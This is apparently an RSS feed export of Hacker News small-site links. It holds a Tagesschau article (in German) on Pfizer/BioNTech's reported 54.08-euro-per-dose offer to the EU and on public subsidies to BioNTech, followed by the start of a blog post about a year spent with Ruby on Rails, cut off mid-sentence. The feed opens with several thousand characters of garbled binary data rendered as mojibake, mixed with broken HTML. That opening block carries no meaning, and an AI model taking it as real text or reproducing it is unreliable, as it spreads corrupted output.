√î¬ΩN)≈ΩYÔøΩ2h&nbsp;¬∂√ú‚ÄòP‚ÄôH'=√™]√É√ã≈Ω3Q‚Ç¨d*‚Ç¨rr8!√†ThrH^‚Ä¢)√áz‚Ñ¢\√å1≈ìw¬´F"≈ì√§w¬°ÔøΩW√ó¬•ÀÜl¬™.@¬®≈†√é_8¬ß0p¬£√éhÔøΩ&nbsp;V‚Äú¬∏¬ß`"d‚Äò‚Ä∞√π¬±√úUÀÜ√õ&nbsp;n¬µM.&lt;√¶8√πs√ö¬¶¬∑W√é	√é;√ìhI‚Äì¬∑
i√ân)√ò‚Äö(&gt;‚Äö&nbsp;¬¢F√¨a¬∞jEVU√Åni¬•A9=E=‚Ä∞√á≈†¬ßo√ç√ñÔøΩ¬§!N‚Äú√â¬•√è√ç≈íR≈íw¬ßg√ñ‚Äù√£&gt;√¥c√ñÀú
√Ä√ù≈æ√î‚Ä°√µ¬•√é3I¬∑fÔøΩ∆í@r)√òÔøΩG‚Äì
√ì√ê‚Ä∞9¬£¬∑¬§f≈Ω√¢‚Ç¨¬ß ∆íJ√ß√•E9√∂¬§t≈†4:√†√î√ì√Ä#$w¬®‚Ä°.¬§≈íT√†√êc!√Üi√§f≈ìqH√éi
√§Ncn*@y¬ßg9&nbsp;.1¬π‚Äù¬©√∑i[√íÔøΩt&gt;‚ÄùÔøΩ√ãw4¬º√í√í‚Äò√á¬Ω&amp;9¬£√∞¬•√í√¶Àú‚Ä†√†w¬•√£¬µ!≈æ*√ª√êz√íj√¨:√ì‚Ä°Jac√öÔøΩI@√Ñ#4‚ÄûE)√©K≈Ωh¬∏	ÔøΩ≈æ‚Äù≈Ω¬¥¬£¬Æ(9√∫≈°hx¬£¬ß√ΩE(‚Äò‚Ä¢¬§
A9¬©3@√áZC¬∏≈í7SB√≠√©√í¬§$b‚ÄúS‚Ä°¬•!√é8¬ßÔøΩ1@¬§¬π√á&amp;‚Äî√πR√¢≈í√¢Àúd√Æ)p√†√±≈†v~‚Ç¨e¬Ω¬®{TjK1'¬µHGj@1√Ü)‚Ç¨‚Ä¶r1√öÔøΩ∆í∆í√ì&amp;8&nbsp;‚Ç¨F1@\h√±M
√â9&nbsp;$¬©√†Q¬≥¬æM¬´≈ì≈°√Æn¬¥(√£¬ØJwj#√í)√ß≈†√¢‚Ç¨≈Ω√ß¬Ω8‚Ç¨x√Ö.8¬¢‚Ç¨¬∏√úc√¢‚Äúp'√û≈æEFs≈†√£q≈°i\¬∑"¬§¬¶√ΩMF&gt;√∂)√ò√µ¬•‚Äú≈°CLb‚Äù/√Æ¬Ω(&nbsp;√∞√∑¬§¬©6≈í√¶‚Äúo4cG‚Ç¨√∫≈Ωi√ò √ìYO√∞√µ&nbsp;Cv}¬©¬°H√ß√≤ÔøΩ¬∏n<w¬ß√±≈Ω¬¥√Äb≈Ωz√Ωh`s√Öi‚Ç¨√ò¬§√áz1¬±¬∑≈°¬¢√ä7√§‚ÄúÔøΩj¬∑"¬≥g≈†‚Ä¶¬£√Ω√ñi¬†l√∏¬≥√∂‚Äù‚Äìf√∏≈∏√•√†¬≤ÀÜÔøΩ‚Ä¢√¢*√≤n*√©‚Äì√©≈°√µ√ü≈Ω√≥√û‚Äπ‚Ç¨‚Äì6@¬™√§√ß+^q√¶ym¬∏\√≥√à¬Ø√ì¬≤√•l,‚Äò√≤√∏‚Äîz¬≤√®ÔøΩ=‚Ä∫√©√πÀú1¬ªÔøΩef√ë¬±¬∏y √°¬ªs√§q¬∏‚Ä¶s√Ä¬Æ√ßk≈ì√öÀú="" a√´jc}√§¬¥√î¬∏e‚Äú8}√©="" ÔøΩ¬§="" √∞ÔøΩ¬≠5z√´√ê‚Äòb@l~ahh¬∞¬£n√î√îm,h√£="" ÔøΩz√í¬´√á$at√≠ÔøΩ√ëg√î^√∂√£¬∂¬°‚Äπ`th¬£q="" t√Ø√´r.√ô$√ö¬π√ö:√ì∆í|√Åtf¬§w¬∂‚Äû="" ¬©‚Äò¬º√Äb≈Ω‚Ä¢*√Ä‚Äôf]√ì¬Ω$‚Äò9="izBL√û¬´√ê¬∫√ê<¬¶√ñ¬°H√§W√π‚Ä†E=√Æ≈ì≈í¬π√π‚Ä°z√á√èÔøΩ8&quot;‚Äî¬Ω¬πvÔøΩ√†√å" ¬£o¬®4√∏¬¶√òdy√°√ò√îo√≥‚Ä°¬±√úz√ìu√∞¬πp="" qk¬†¬µ√ê√°!√Üwr="" 3√å‚Äú√ç√ü'*zrk√úgw(ÔøΩx√π√†st‚Ä¢‚Äòvv¬∏√π'de√Ω√ô√ß‚Äöi√©itljs¬¶`√únq√à¬¶√Ü√´√Ω√ú√û¬¶√ù="" √©tj‚Ä¶√°!√∞azhl¬æa√Å<≈°pup[p9√≠q¬≥¬¢¬∏√µ¬¢(vl‚Ñ¢~n¬£‚Äúpm√ÇÔøΩ¬π$nwb≈†¬´‚Äò≈æ~¬¥‚Ç¨‚Äû[¬°√æty¬±¬´≈íq‚Ñ¢¬£¬∞¬ß¬ª="" √±ÔøΩ√û‚Äû7w√ès√â4¬≥!‚Ñ¢≈Ω="M;¬®ÀÜÀú" ‚Ä¶√à√á¬§yt√à√ã$y√£¬≠9jp¬¢l√ê√í*¬®b√π√èa@z≈Ω;6ÔøΩ√ã√Ét¬†&6‚Ä¢√ã="" √¥¬®]Àú&√û¬ß¬®¬©√°ÔøΩ‚Äû#≈°m\my\w√π‚Ä∫≈†√ò≈°l∆í√≤‚Äîp="I¬ß¬∞‚Ñ¢√πL`w‚ÄòI¬¥8√™jn√ê‚Ä¢√∑¬¨√™¬™√ºn√©≈†l√ár√á¬∏`√ï‚Äî‚Ä∞{√±¬πGzÔøΩ¬§M‚Ç¨¬ÆA√Ö" √´¬†√ì√™ÀÜ√°`≈Ωf:√≠4¬≤√é]‚Äò√•tpÔøΩ√©lt?v1‚Äöfri¬®l`¬©c√î√∫√ï√ô="K¬≤√ú¬±√ß">√áC√Å¬®¬º√ñ;T‚Ä†√ß√í‚Ä∫s√º¬§√≥√ÖY√òc‚Ä∞≈ì¬æ√¶¬°√ôd‚Äû‚Ä∞J#¬∞8√áoZ‚Äû;1gv√Ü*Gw√ò¬§¬º3M2≈æT`¬¶3≈æ√¥-5√ÆG¬∞¬≤d∆í√ó≈ìS√ê0ufb‚Ñ¢<g√í‚Äì<√Ñ‚Äôg`)¬≤‚Ä°ÔøΩpo¬•=j√≤u√ô<√å‚Äò√ê√∫√ì≈í≈æd>n}√©¬®$Vg√π[√∫S≈°I√é√¨t√èJz7¬®√≠}	‚Äùy‚Äû;√∂√¥¬•pÔøΩ√≥≈°ÀÜI0√ßmKÔøΩ‚Ä∫¬≤H√´R√∑+¬∏#√É¬Æ√êO≈æv√ß ¬∑¬°¬¶Ep$P1√ì≈í≈æ√î√µÔøΩ¬≥g‚Ç¨8√∫√ê√ï√ò4√óA¬§2¬¶√ºÔøΩ‚Ñ¢√ß√®e8y√õ√çB√≤√éKF¬øOj#!KaH^√∏¬´‚Äô√ê¬´i¬©nY√≠ÔøΩa≈í‚Ä°¬π'‚Äöi‚Äô;√Öb√Ä¬¶	#ÔøΩs√§≈æA√¶‚Äîx2b{{√î$M¬ºÀÜ6√à‚Ä°'4√¢`</g√≤‚Äì<√§‚Äôg`)¬≤‚Ä°ÔøΩpo¬•=j√≤u√π<√¨‚Äò√∞√∫√≥≈ì≈æd></w¬ß√±≈æ¬¥√†b≈æz√Ωh`s√•i‚Ç¨√∏¬§√ßz1¬±¬∑≈°¬¢√™7√§‚ÄúÔøΩj¬∑"¬≥g≈°‚Ä¶¬£√Ω√∂i¬†l√∏¬≥√∂‚Äù‚Äìf√∏√ø√•√†¬≤ÀÜÔøΩ‚Ä¢√¢*√≤n*√©‚Äì√©≈°√µ√ü≈æ√≥√æ‚Äπ‚Ç¨‚Äì6@¬™√§√ß+^q√¶ym¬∏\√≥√®¬Ø√≥¬≤√•l,‚Äò√≤√∏‚Äîz¬≤√®ÔøΩ=‚Ä∫√©√πÀú1¬ªÔøΩef√±¬±¬∏y></tÔøΩ'√∂`ÔøΩ‚Äî{√©"¬™ÔøΩ¬©¬Ø√≤></r></c√∂‚Ä∫¬±¬°√™∆í√∑‚Ä°j≈°w‚Äù.√•≈°¬Æ‚Ä¶√®√´≈æ√¥‚Äú)6√∞√∞¬¶8√ßÔøΩ¬®√µ√π></b‚Ä¢‚Ç¨¬°¬π√£≈°‚Äù√£‚Ä†v√†ÔøΩ√¶j\9¬§ÔøΩ‚Äö1≈æ></u¬≥‚Ç¨*'√ß¬µ$2¬∏.@=></b‚Ä¢√ßa√Æ¬π√¶)h></tgildw¬ßu¬∏s.√°$8|√≠'‚Äò]¬ø√¢√©l√¥gf'√∑√™8√Ø√•q√≠‚Ñ¢√æ09√®¬Æ√ó√°≈ì-s√±cbÀÜ√∫√§}kÔøΩ√øÔøΩu></q¬∑√≤‚ÄùÔøΩ≈ì√ºkt√¨*n:b≈ìq≈°ls@></xtxkx‚Äöx≈°x¬±x√©x√†x√∏yy'y></sosbsusÀÜs‚Ä∫s¬Æs√°s√¥s√ßs√∫t></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.apollopresskits.com/cs/c/?cta_guid=69bda2b0-603b-4c91-bf30-c3d425396f31&amp;signature=AAH58kE89ooPCBnAEHIF6NwUgRUo-tIeiA&amp;pageId=7962764933&amp;placement_guid=00362abe-1f60-422e-99aa-75f5e9edf2e9&amp;click=76a4887d-6ed6-41ad-8f35-f49bfbfb5ef6&amp;hsutk=c7a00000190d1bd81cf30177b699595f&amp;canon=https%3A%2F%2Fwww.apollopresskits.com%2Fapollo-presskit-directory&amp;utm_referrer=https%3A%2F%2Fpinboard.in%2Fu%3Amichaelcolenso%2Fbefore%3A1569472943&amp;portal_id=413105&amp;redirect_url=APefjpE9rO6ok2BaATb973oLgLwidfs4zRYwQVkhov4aq3jijtJU9oC3_MkthEIQajAD2N7OYtegEpDri0ocRWxVVLga-zgB54CWPGlhDPe5Hs7yGVQ4i-Bg8al-HsINkLxHD7A5NZMRQuOTY2HFAYJ1b50AuY62q-AzqiHpeVCtj-WgsQyex1s">https://www.apollopresskits.com/cs/c/?cta_guid=69bda2b0-603b-4c91-bf30-c3d425396f31&amp;signature=AAH58kE89ooPCBnAEHIF6NwUgRUo-tIeiA&amp;pageId=7962764933&amp;placement_guid=00362abe-1f60-422e-99aa-75f5e9edf2e9&amp;click=76a4887d-6ed6-41ad-8f35-f49bfbfb5ef6&amp;hsutk=c7a00000190d1bd81cf30177b699595f&amp;canon=https%3A%2F%2Fwww.apollopresskits.com%2Fapollo-presskit-directory&amp;utm_referrer=https%3A%2F%2Fpinboard.in%2Fu%3Amichaelcolenso%2Fbefore%3A1569472943&amp;portal_id=413105&amp;redirect_url=APefjpE9rO6ok2BaATb973oLgLwidfs4zRYwQVkhov4aq3jijtJU9oC3_MkthEIQajAD2N7OYtegEpDri0ocRWxVVLga-zgB54CWPGlhDPe5Hs7yGVQ4i-Bg8al-HsINkLxHD7A5NZMRQuOTY2HFAYJ1b50AuY62q-AzqiHpeVCtj-WgsQyex1s</a></em></p>]]>
            </description>
            <link>https://www.apollopresskits.com/cs/c/?cta_guid=69bda2b0-603b-4c91-bf30-c3d425396f31&amp;signature=AAH58kE89ooPCBnAEHIF6NwUgRUo-tIeiA&amp;pageId=7962764933&amp;placement_guid=00362abe-1f60-422e-99aa-75f5e9edf2e9&amp;click=76a4887d-6ed6-41ad-8f35-f49bfbfb5ef6&amp;hsutk=c7a00000190d1bd81cf30177b699595f&amp;canon=https%3A%2F%2Fwww.apollopresskits.com%2Fapollo-presskit-directory&amp;utm_referrer=https%3A%2F%2Fpinboard.in%2Fu%3Amichaelcolenso%2Fbefore%3A1569472943&amp;portal_id=413105&amp;redirect_url=APefjpE9rO6ok2BaATb973oLgLwidfs4zRYwQVkhov4aq3jijtJU9oC3_MkthEIQajAD2N7OYtegEpDri0ocRWxVVLga-zgB54CWPGlhDPe5Hs7yGVQ4i-Bg8al-HsINkLxHD7A5NZMRQuOTY2HFAYJ1b50AuY62q-AzqiHpeVCtj-WgsQyex1s</link>
            <guid isPermaLink="false">hacker-news-small-sites-26184346</guid>
            <pubDate>Thu, 18 Feb 2021 19:30:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BioNTech/Pfizer sought 54.08 Euro per vaccine dose from EU (de)]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 41 (<a href="https://news.ycombinator.com/item?id=26184301">thread link</a>) | @_Microft
<br/>
February 18, 2021 | https://www.tagesschau.de/investigativ/ndr-wdr/corona-impfstoff-biontech-105.html | <a href="https://web.archive.org/web/*/https://www.tagesschau.de/investigativ/ndr-wdr/corona-impfstoff-biontech-105.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                <div>
    
    
    <div>
        <div>
            <p><span>
                    Exklusiv
                </span>
            </p>
            
            <p>
                Stand: 18.02.2021 17:00 Uhr
            </p>
        </div>
    </div>
</div>
                
                    

    
    
        
    
    <p>
        <strong>Die Pharmaunternehmen Pfizer und BioNTech wollten nach Informationen von </strong><strong><em>NDR, WDR</em></strong><strong> und "SZ" im Juni von der EU f√ºr eine Dosis Impfstoff 54,08 Euro. Der Arzneimittelchef der √Ñrztekammer spricht von "unseri√∂sem Profitstreben".</strong>
    </p>

    

    




    

                
                    

    
    
        <div>

    

    
        <div>
            <p>
                    <span><em>Von Markus Grill und Georg Mascolo,  </em></span><em>
                    <span>NDR/WDR</span></em>
                </p>
        </div>
    
</div>
    

    




    

                
                    

    
    
        
    
    <p>
        Im Juni des vergangenen Jahres ging bei der EU-Kommission ein streng vertrauliches Angebot der Pharmahersteller Pfizer und BioNTech ein. Darin boten sie nach Informationen von <em>NDR, WDR</em> und "S√ºddeutscher Zeitung" ihren Impfstoff zum Preis von 54,08 Euro pro Dosis an, bei einer Abnahme von 500 Millionen Dosen. Insgesamt wollten BioNTech/Pfizer also 27 Milliarden Euro f√ºr so viel Impfstoff, dass man damit gut die H√§lfte der EU-Bev√∂lkerung impfen k√∂nnte. Der Preis, so versicherten Pfizer/BioNTech, beinhalte bereits "den h√∂chsten prozentualen Rabatt", der einem Industrieland weltweit angeboten worden sei.
    </p>

    

    




    

                
                    

    
    
        
    
    <p>
        Mit 54,08 Euro w√§re der BioNTech-Impfstoff allerdings mehr als 20-mal so teuer gewesen wie eine Dosis jenes Impfstoffs, den AstraZeneca gemeinsam mit der Universit√§t Oxford entwickelt hat. "Ich halte den Preis f√ºr unseri√∂s", kritisiert der Vorsitzende der Arzneimittelkommission der Deutschen √Ñrzteschaft, Wolf Dieter Ludwig, das Angebot von Pfizer/BioNTech. "Ich sehe darin ein Profitstreben, das in der jetzigen Situation der Pandemie in keiner Weise gerechtfertigt ist."
    </p>

    

    




    

                
                    

    
    
        
    

    




    
        
        
            
            
            
            
            
            
                
    
    

        
    

            
            
            
            
            
        
    

                
                    

    
    
        
    

    




    
        
        
            
            
            
            
            
                
            
            
            
            
            
            
        
    

                
                    

    
    
        

    

    <h2>Verst√§ndnis f√ºr Z√∂gern der EU</h2>


    

    




    

                
                    

    
    
        
    
    <p>
        Wom√∂glich werfen diese vergleichsweise hohen Preisvorstellungen auch ein neues Licht auf die Zur√ºckhaltung mancher EU-L√§nder im Sommer gegen√ºber dem BioNTech-Impfstoff. Ludwig jedenfalls sagt, dass er die EU verstehe: "Ich denke, sie hat mit Recht gez√∂gert bei einem derartig hohen Preis."
    </p>

    

    




    

                
                    

    
    
        
    
    <p>
        In einem Interview mit dem "Spiegel" Anfang des Jahres kritisierte BioNTech-Chef Ugur Sahin die Verhandlungen mit der EU: "Der Prozess in Europa lief sicherlich nicht so schnell und geradlinig ab wie mit anderen L√§ndern", sagte der Firmenchef. "Offenbar herrschte der Eindruck: Wir kriegen genug, es wird alles nicht so schlimm, und wir haben das unter Kontrolle. Mich hat das gewundert."
    </p>

    

    




    

                
                    

    
    
        
    
    <p>
        Eine Anfrage zu einem Gespr√§ch √ºber das hohe Preisangebot lie√ü Sahin diese Woche unbeantwortet. Eine Firmensprecherin beantwortete konkrete Fragen zum Angebot nicht, wies aber darauf hin, dass der Preis f√ºr den Impfstoff "von verschiedenen Faktoren abh√§ngig" sei. Er liege "in einer gewissen Spanne f√ºr alle L√§nder mit h√∂herem Einkommen". Bisher habe das Unternehmen jedoch keine Gewinne gemacht. Wenn man aber Gewinne aus dem Vertrieb des Covid-19-Impfstoffs mache, wolle man diese "in die Weiterentwicklung dieser Technologie reinvestieren". Ein Sprecher der EU-Kommission teilte per E-Mail mit, dass die EU-Kommission aus vertragsrechtlichen Gr√ºnden keine Angaben √ºber die Preise machen d√ºrfe.
    </p>

    

    




    

                
                    

    
    
        
    

    




    
        
        
            
            
            
            
            
                
            
            
            
            
            
            
        
    

                
                    

    
    
        

    

    <h2>Offenbar deutlich niedrigeren Preis durchgesetzt</h2>


    

    




    

                
                    

    
    
        
    
    <p>
        Erst im November kam die EU zu einem Vertragsabschluss mit Pfizer/BioNTech. Der endg√ºltige Preis wird bis heute zwar geheim gehalten, doch nach Informationen von <em>NDR, WDR</em> und "SZ" soll er bei 15,50 Euro pro Dosis liegen. Als erste hatte auch die Nachrichtenagentur Reuters diesen Preis erfahren. Die EU h√§tte damit also eine deutliche Preissenkung gegen√ºber dem Angebot im Juni erreicht.
    </p>

    

    




    

                
                    

    
    
        
    
    <p>
        Auch die USA zahlen in etwa gleich viel. Sie hatten im Juli bereits einen Vertrag mit Pfizer geschlossen, der ihnen 100 Millionen Dosen f√ºr 1,95 Milliarden Dollar sicherte. Umgerechnet ergibt das rund 16 Euro pro Dosis.
    </p>

    

    




    

                
                    

    
    
        
    

    




    
        
        
            
            
            
            
            
                
            
            
            
            
            
            
        
    

                
                    

    
    
        

    

    <h2>Staatliche Subventionierung in Millionenh√∂he</h2>


    

    




    

                
                    

    
    
        
    
    <p>
        √úberraschend ist aber nicht nur der hohe Preis, den Pfizer/BioNTech von der EU kassieren wollten, sondern auch die Behauptung in dem Angebot an die EU, man h√§tte die Entwicklung des Impfstoffes "komplett selbst finanziert".
    </p>

    

    




    

                
                    

    
    
        
    
    <p>
        Das mag vielleicht f√ºr Pfizer gelten. Nicht aber f√ºr die deutsche Firma BioNTech, die den Impfstoff entwickelt hatte - auch wenn manche derzeit glauben, dass BioNTech allein mit dem Geld der Hexal-Gr√ºnder Andreas und Thomas Str√ºngmann aufgebaut wurde. 
    </p>

    

    




    

                
                    

    
    
        
    
    <p>
        Tats√§chlich war ihr Engagement entscheidend - aber BioNTech wurde auch mit mehreren Millionen Euro staatlich subventioniert. So teilt das Bundesministerium f√ºr Bildung und Forschung (BMBF) auf Anfrage von <em>NDR, WDR</em> und "SZ" mit, dass das Ministerium "die Gr√ºndungsphase von Biontech ma√ügeblich unterst√ºtzt und die entscheidenden ersten Jahre der Ausgr√ºndung finanziell und auch strukturell gef√∂rdert hat".
    </p>

    

    




    

                
                    

    
    
        
    
    <p>
        Einen weiteren Schub hatte BioNTech demnach von 2012 bis 2017 als Gewinner des Spitzencluster-Wettbewerbs erhalten, das vom Forschungsministerium mit 12,9 Millionen Euro gef√∂rdert worden sei, wie BMBF-Sprecher Stephan K√ºgele mitteilte. Auf Nachfrage teilt auch die BioNTech-Sprecherin mit, das Unternehmen habe "w√§hrend der ersten Jahre nach Gr√ºndung ca. 50 Millionen Euro F√∂rdergelder durch die Clusterinitiative und EU-Programme erhalten." Im Sommer 2020 bekam die Firma weitere 375 Millionen Euro vom Bundesforschungsministerium f√ºr die mRNA-basierte Impfstoffentwicklung zugesagt.
    </p>

    

    




    

                
                    

    
    
        
    

    




    
        
        
            
            
            
            
            
                
            
            
            
            
            
            
        
    

                
                    

    
    
        

    

    <h2>Impfschutz wichtiger als Aktion√§rsinteressen</h2>


    

    




    

                
                    

    
    
        
    
    <p>
        "Die pharmazeutische Industrie sagt ja immer, die hohen Kosten entstehen aufgrund der Forschungs- und Entwicklungskosten, aber auch, weil der Nutzen so gro√ü ist", sagt Wolf Dieter Ludwig. Tats√§chlich k√∂nne man den Nutzen derzeit aber nicht endg√ºltig beurteilen und die Forschung und Entwicklung sei zum Teil mit staatlichen Geldern subventioniert worden. Allein die US-Regierung zahlte mehrere Milliarden US-Dollar an verschiedene Hersteller. 
    </p>

    

    




    

                
                    

    
    
        
    
    <p>
        "Von daher sind diese hohen Preisforderungen aus meiner Sicht nicht berechtigt", sagt Ludwig. Er verstehe zwar, dass die Aktion√§re dieser Firmen auch ihren Anteil wollen. "Aber wir sind derzeit in einer Krisensituation, wo es das Ziel sein muss, nicht nur in den Industriel√§ndern, sondern weltweit zu impfen. Vor diesem Hintergrund, denke ich, haben die Interessen der Aktion√§re weniger Bedeutung als die Interessen der Bev√∂lkerungen, die von dieser Pandemie befreit werden wollen."
    </p>

    

    




    

                
                    

    
    
        
    

    




    
        
        
            
            
            
            
            
            
            
                

    

        

        
    

            
            
            
            
        
    

                
                    

    
    
        
    

    




    
        
        
            
            
            
            
            
                
            
            
     ‚Ä¶</article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.tagesschau.de/investigativ/ndr-wdr/corona-impfstoff-biontech-105.html">https://www.tagesschau.de/investigativ/ndr-wdr/corona-impfstoff-biontech-105.html</a></em></p>]]>
            </description>
            <link>https://www.tagesschau.de/investigativ/ndr-wdr/corona-impfstoff-biontech-105.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26184301</guid>
            <pubDate>Thu, 18 Feb 2021 19:26:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Year of Rails]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26184215">thread link</a>) | @jashkenas
<br/>
February 18, 2021 | https://macwright.com/2021/02/18/a-year-of-rails.html | <a href="https://web.archive.org/web/*/https://macwright.com/2021/02/18/a-year-of-rails.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><picture><source srcset="https://macwright.com/images/2021-02-18-a-year-of-rails-railroad.webp" type="image/webp"><img alt="Railroad" src="https://macwright.com/images/2021-02-18-a-year-of-rails-railroad.jpg"></picture></p><p>I spent most of 2020 working with <a href="https://rubyonrails.org/">Ruby on Rails</a>. I moved a project from <a href="https://nextjs.org/">Next.js</a> + <a href="https://www.rust-lang.org/">Rust</a> to‚Ä¶&nbsp;Rails, baby! Back to the future. My earlier post on <a href="https://macwright.com/2020/05/10/spa-fatigue.html"><em>Second-guessing the modern web</em></a> was inspired by this experience, that for the product we were building, a ‚Äòmodern‚Äô stack was not working as well as a traditional one.</p><p>We didn‚Äôt do competitive analysis against Laravel, Django, or Phoenix. They‚Äôre similar, not radically better or worse. There are multiple acceptable solutions to a problem, and this was more a matter of choosing the right <em>kind</em> of solution than pursuing some kind of perfect choice and burning hours and motivation doing the window-shopping.</p><p>What helped Rails win was that the team had a little more experience in Ruby (with the exception of myself), and we found plenty of resources for developing and deploying the stack. Rails fit perfectly into the ideology of <a href="http://boringtechnology.club/"><em>Choosing boring technology</em></a>. Another part of the product would be the hard, innovative part, so it made no sense to grapple with bleeding-edge web frameworks.</p><p>This was a really fun experience. There‚Äôs a lot to love about Rails. Other communities could learn a bit from the Ruby &amp; Rails culture and wisdom. I won‚Äôt implement <em>everything</em> in Rails, but it‚Äôll be part of the toolbox.</p><p>Before this, I hadn‚Äôt touched the stuff. And I bet a lot of people are like that - they came of age in the world of React and Go, and haven‚Äôt tried anything even remotely similar to Rails. For their benefit, and to debrief from 2020, here are some notes on the experience. Plus, <a href="https://macwright.com/2020/10/28/if-not-spas.html">Rails-like projects in JavaScript</a> are ramping up quickly, and it‚Äôs fun to know the origins.</p><h2 id="the-good">The good</h2><h3 id="debugging-rails-apps-is-amazing">Debugging Rails apps is amazing</h3><p>A while ago, I <a href="https://twitter.com/tmcw/status/1321133460501585922">wrote on Twitter</a></p><blockquote><p>the real reason why javascript developers don‚Äôt use breakpoints and use console.log is that breakpoints don‚Äôt work</p></blockquote><p>After years of working in JavaScript, I‚Äôm used to bad debugging experiences. The Chrome debugger‚Äôs <a href="https://developers.google.com/web/updates/2015/05/automatically-pause-on-any-exception">automatic pause on caught exceptions</a> is amazing, sometimes. But throwing a <code>debugger</code> statement in some React code is dodgy as hell. Sometimes it works, mostly it doesn‚Äôt. You have to deal with code that might not have the right <a href="https://www.html5rocks.com/en/tutorials/developertools/sourcemaps/">sourcemap</a> to translate from bundled &amp; minified code to original source. Subtle abstractions like React hooks and advanced transpiler stuff like <a href="https://github.com/facebook/regenerator">Regenerator</a> mean that your code‚Äôs stacktrace probably looks nothing like what you expect, with lots of internal garbage. Sure, you can learn better techniques for diagnosing and debugging errors, but it‚Äôs not just you - the debugging story in JavaScript is pretty bad. This applies even to Node.js, where one of the debugging stories is to connect Chrome‚Äôs debugger to a Node.js instance:&nbsp;a finicky solution that doesn‚Äôt consistently work.</p><p>In Rails, there is <a href="https://github.com/deivid-rodriguez/byebug">byebug</a>. You write <strong><code>byebug</code></strong> in your source code, and you get an interactive REPL right there. It works in views, controllers, database migrations, everywhere. It almost always works. Variables are named what you expect. The whole system is paused at that moment, and you can actually interact with it, using all of the Rails utilities and your installed gems.</p><p>If a page crashes unexpectedly, you get a similar REPL experience, in your browser, automatically. With an automatically cleaned-up stacktrace that excludes Rails‚Äôs own frames. Like the byebug interface, this REPL actually works and is consistently helpful in finding root causes. Rarely will you need to use <code>puts</code> to print something to the console because this debugging system is so good.</p><h3 id="the-magic-mostly-works">The magic mostly works</h3><p>Our Rails app didn‚Äôt have any <code>require</code> statements. You mention a module‚Äôs name, and it‚Äôs automatically included, using <a href="https://github.com/fxn/zeitwerk">Zeitwork</a>, a tool that comes standard with Rails.</p><p>This kind of system was terrifying to me before. What if you accidentally import something just by mentioning it? What if two things have the same name and you import the wrong one? How do you really know what‚Äôs happening? Sure, you‚Äôre happy now, with all of that annoying importing and exporting taken care of, but the sky might fall.</p><p>Or maybe it just‚Ä¶ doesn‚Äôt. Maybe impure, vaguely risky techniques are just a net positive over time, and making everything fully explicit isn‚Äôt really necessary? Now when I‚Äôm using other systems, I wonder - what if I could just mention one of my React components and it would just‚Ä¶ be there? Sure, the system would have to complain if there were two components with the same name, and it would have to make assumptions about directory structure, but overall, wouldn‚Äôt this be nice?</p><p>This applies to a lot of other parts of the system too. Rails is famous for doing pluralization - you name a model <code>Post</code> and you automatically get an interface called <code>posts</code>. But what, you ask, of words with uneven pluralization rules? Rails actually&nbsp;<a href="https://weblog.rubyonrails.org/2005/8/25/10-reasons-rails-does-pluralization/">does the right thing</a>, almost always. And when it fails, you can override it. It actually just saves time, reliably.</p><h3 id="testing-works">Testing works</h3><p>I‚Äôve tried to test front-end applications. I‚Äôve set up <a href="https://nightwatchjs.org/">nightwatch</a>, <a href="https://jestjs.io/">jest</a>, <a href="https://enzymejs.github.io/enzyme/">enzyme</a>, <a href="https://www.cypress.io/">cypress</a>, and probably 5-10 other frameworks. <em>Front-end testing is universally terrible.</em> Projects like Cypress are throwing untold hours into making it less terrible, taking on massive amounts of complexity to abstract away from fickle browser behavior and complex interactions.</p><p>But it still sucks. Frontend testing has no good attributes: it‚Äôs unreliable, hard to automate, hard to debug when it fails, and often doesn‚Äôt even assert for important behaviors, so it doesn‚Äôt actually identify regressions. Running frontend tests in CI is resource-heavy, requiring you to set up headless X windows environments on servers or use specialized CI services that produce screencasts of test runs.</p><p>Testing fully-server-rendered applications, on the other hand, is <em>amazing</em>. A vanilla testing setup with Rails &amp; <a href="https://rspec.info/">RSpec</a> can give you fast, stable, concise, and actually-useful test coverage. You can actually assert for behavior and navigate through an application like a user would. These tests are solving a simpler problem - making requests and parsing responses, without the need for a full browser or headless browser, without multiple kinds of state to track.</p><p>Not only do the tests work better, the testing culture is a completely different universe. There are entire books written about how to write RSpec tests that catch bugs, allow software evolution, and aren‚Äôt filled with boilerplate.</p><h3 id="gems-are-so-powerful">Gems are so powerful</h3><p>Powerful and dangerous.</p><p>I‚Äôm used to modules as they work in other systems - Python, Node, Elm, and so on. They provide objects, functions, and variables that you can import and combine into your code explicitly. Usually they sit on some specific level of abstraction - it‚Äôs a utility for connecting to servers or a React component you can use.</p><p>Gems can do so much more. You install something like <a href="https://github.com/heartcombo/devise">Devise</a> into your system and it adds views, routes, methods, utilities, you name it. It‚Äôs not like ‚Äúloading some functions‚Äù, it‚Äôs more like composing a whole different app <em>into</em> your app, implicitly.</p><p>This is obviously terrifying. It means that you can‚Äôt look at your directories of views and your file of <code>routes.rb</code> and know what exists at a glance. There are other layers, lurking in the ephemeral space of third-party code. They interact in serious but uncertain ways.</p><p>But it‚Äôs also pretty incredible - the idea that something like <a href="http://www.passportjs.org/">passport</a>, Node‚Äôs middleware, could instead be a full-fledged authentication system. It means that you have to write a lot less code, and it also means that the people who <em>use</em> that code have a lot more code in common. That gems can work on a higher level of abstraction, making it possible to cobble together software faster, to write less ‚Äòglue code.‚Äô</p><h3 id="theres-so-much-good-writing-about-rails">There‚Äôs so much good writing about Rails</h3><p>Even if you don‚Äôt write Ruby, you should pay attention to <a href="https://sandimetz.com/">Sandi Metz</a>. She‚Äôs incredibly wise and has so many incredible ideas to share.</p><p>And then there‚Äôs <a href="https://blog.arkency.com/">arkency</a>, <a href="https://thoughtbot.com/blog/">ThoughtBot</a>, and so many other thoughtful writers with years of experience in Rails. Sometimes it‚Äôs a little shocking to google for some obscure problem and see a decade of discussion about it.</p><p>The best practices are also formalized into tools like <a href="https://codeclimate.com/">Code Climate</a> and <a href="https://github.com/troessner/reek">reek</a>. I‚Äôve never seen so many actually-useful suggestions come out of automated systems as I did in the world of Ruby and 